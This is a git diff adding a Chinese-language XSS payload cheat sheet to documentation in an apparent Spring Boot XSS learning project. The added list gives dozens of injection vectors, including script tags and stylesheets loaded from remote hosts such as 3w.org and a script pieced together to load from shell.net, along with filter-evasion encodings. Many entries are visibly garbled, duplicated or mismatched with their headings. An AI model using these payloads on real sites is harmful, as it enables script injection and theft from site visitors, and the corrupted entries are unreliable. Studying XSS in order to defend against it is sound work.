@@ -146,7 +146,234 @@ http://localhost:8080/page/DomXssDemo.html?param=javascript%3Avoid(0)%27%20oncli
     | th:action   |            表单提交的地址            | `<form action="subscribe.html" th:action="@{/subscribe}">`   |
     | th:remove   |             删除某个属性             | `<tr th:remove="all"> 1.all:删除包含标签和所有的孩子。2.body:不包含标记删除,但删除其所有的孩子。3.tag:包含标记的删除,但不删除它的孩子。4.all-but-first:删除所有包含标签的孩子,除了第一个。5.none:什么也不做。这个值是有用的动态评估。` |
     | th:attr     | 设置标签属性，多个属性可以用逗号分隔 | `比如 th:attr="src=@{/image/aa.jpg},title=#{logo}"，此标签不太优雅，一般用的比较少。` |
-
+1. XSS攻击代码出现的场景
+    - **普通的XSS JavaScript注入**，示例如下：
+      ```
+      <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+      ```
+    - **IMG标签XSS使用JavaScript命令**，示例如下：
+      ```
+      <SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+      ```
+    - **IMG标签无分号无引号**，示例如下：
+      ```
+      <IMG SRC=javascript:alert(‘XSS’)>
+      ```
+    - **IMG标签大小写不敏感**，示例如下：
+      ```
+      <IMG SRC=JaVaScRiPt:alert(‘XSS’)>
+      ```
+    - **HTML编码(必须有分号)**，示例如下：
+      ```
+      <IMG SRC=javascript:alert(“XSS”)>
+      ```
+    - **修正缺陷IMG标签**，示例如下：
+      ```
+      <IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
+      ```
+    - **formCharCode标签**，示例如下：
+      ```
+      <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+      ```
+    - **UTF-8的Unicode编码**，示例如下：
+      ```
+      <IMG SRC=jav..省略..S')>
+      ```
+    - **7位的UTF-8的Unicode编码是没有分号的**，示例如下：
+      ```
+      <IMG SRC=jav..省略..S')>
+      ```
+    - **十六进制编码也是没有分号**，示例如下：
+      ```
+      <IMG SRC=\'#\'" /span>
+      ```
+    - **嵌入式标签,将Javascript分开**，示例如下：
+      ```
+      <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
+      ```
+    - **嵌入式编码标签,将Javascript分开**，示例如下：
+      ```
+      <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
+      ```
+    - **嵌入式换行符**，示例如下：
+      ```
+      <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
+      ```
+    - **嵌入式回车**，示例如下：
+      ```
+      <IMG SRC=\'#\'" ascript:alert(‘XSS’);”>
+      ```
+    - **嵌入式多行注入JavaScript,这是XSS极端的例子**，示例如下：
+      ```
+      <IMG SRC=\'#\'" /span>
+      ```
+    - **解决限制字符(要求同页面)**，示例如下：
+        ```javascript
+        <script>z=z+ ’write(“‘</script>
+        <script>z=z+ ’<script’</script>
+        <script>z=z+ ’ src=ht’</script>
+        <script>z=z+ ’tp://ww’</script>
+        <script>z=z+ ’w.shell’</script>
+        <script>z=z+ ’.net/1.’</script>
+        <script>z=z+ ’js></sc’</script>
+        <script>z=z+ ’ript>”)’</script>
+        <script>eval_r(z)</script>
+        ```
+    - **空字符**，示例如下：
+      ```
+      perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
+      ```
+    - **空字符2,空字符在国内基本没效果.因为没有地方可以利用**，示例如下：
+      ```
+      perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
+      ```
+    - **Spaces和meta前的IMG标签**，示例如下：
+      ```
+      <IMG SRC=\'#\'"  
+      
+      javascript:alert(‘XSS’);”>
+      ```
+    - **Non-alpha-non-digit XSS**，示例如下：
+      ```
+      <SCRIPT/XSS SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
+      ```
+    - **Non-alpha-non-digit XSS to 2**，示例如下：
+      ```
+      <BODY onload!#$%&()*~+ -_.,:;?@[/|\]^`=alert(“XSS”)>
+      ```
+    - **Non-alpha-non-digit XSS to 3**，示例如下：
+      ```
+      <SCRIPT/SRC=\'#\'" /span>http://3w.org/XSS/xss.js”></SCRIPT>
+      ```
+    - **双开括号**，示例如下：
+      ```
+      <<SCRIPT>alert(“XSS”);//<</SCRIPT>
+      ```
+    - **无结束脚本标记(仅火狐等浏览器)**，示例如下：
+      ```
+      <SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
+      ```
+    - **无结束脚本标记2**，示例如下：
+      ```
+      <SCRIPT SRC=//3w.org/XSS/xss.js>
+      ```
+    - **半开的HTML/JavaScript XSS**，示例如下：
+      ```
+      <IMG SRC=\'#\'" /span>
+      ```
+    - **双开角括号**，示例如下：
+      ```
+      <iframe src=http://3w.org/XSS.html <
+      ```
+    - **无单引号 双引号 分号**，示例如下：
+      ```
+      <SCRIPT>a=/XSS/
+      alert(a.source)</SCRIPT>
+      ```
+    - **换码过滤的JavaScript**，示例如下：
+      ```
+      \”;alert(‘XSS’);//
+      ```
+    - **结束Title标签**，示例如下：
+      ```
+      </TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
+      ```
+    - **Input Image**，示例如下：
+      ```
+      <INPUT SRC=\'#\'" /span>
+      ```
+    - **BODY Image**，示例如下：
+      ```
+      <BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+      ```
+    - **BODY标签**，示例如下：
+      ```
+      <BODY(‘XSS’)>
+      ```
+    - **IMG Dynsrc**，示例如下：
+      ```
+      <IMG DYNSRC=\'#\'" /span>
+      ```
+    - **IMG Lowsrc**，示例如下：
+      ```
+      <IMG LOWSRC=\'#\'" /span>
+      ```
+    - **BGSOUND**，示例如下：
+      ```
+      <BGSOUND SRC=\'#\'" /span>
+      ```
+    - **STYLE sheet**，示例如下：
+      ```
+      <LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>
+      ```
+    - **远程样式表**，示例如下：
+      ```
+      <LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>
+      ```
+    - **List-style-image(列表式)**，示例如下：
+      ```
+      <STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS
+      ```
+    - **IMG VBscript**，示例如下：
+      ```
+      <IMG SRC=\'#\'" /STYLE><UL><LI>XSS
+      ```
+    - **META链接url**，示例如下：
+      ```
+      <META HTTP-EQUIV=”refresh” CONTENT=”0; URL=http://;URL=javascript:alert(‘XSS’);”>
+      ```
+    - **Iframe**，示例如下：
+      ```
+      <IFRAME SRC=\'#\'" /IFRAME>
+      ```
+    - **Frame**，示例如下：
+      ```
+      <FRAMESET><FRAME SRC=\'#\'" /FRAMESET>
+      ```
+    - **Table**，示例如下：
+      ```
+      <TABLE BACKGROUND=”javascript:alert(‘XSS’)”>
+      ```
+    - **TD**，示例如下：
+      ```
+      <TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>
+      ```
+    - **DIV background-image**，示例如下：
+      ```
+      <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
+      ```
+    - **DIV background-image后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)**，示例如下：
+      ```
+      <DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
+      ```
+    - **DIV expression**，示例如下：
+      ```
+      <DIV STYLE=”width: expression_r(alert(‘XSS’));”>
+      ```
+    - **STYLE属性分拆表达**，示例如下：
+      ```
+      <IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
+      ```
+    - **匿名STYLE(组成:开角号和一个字母开头)**，示例如下：
+      ```
+      <XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
+      ```
+    - **STYLE background-image**，示例如下：
+      ```
+      <STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A CLASS=XSS></A>
+      ```
+    - **IMG STYLE方式**，示例如下：
+      ```
+      exppression(alert(“XSS”))’>
+      ```
+    - **STYLE background**，示例如下：
+      ```
+      <STYLE><STYLE type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>
+      ```
+    - **BASE**，示例如下：
+      ```
+      <BASE HREF=”javascript:alert(‘XSS’);//”>
+      ```
 
 #### 示例
 `https://github.com/moon-zhou/spring-learning/tree/master/spring-boot-xss`
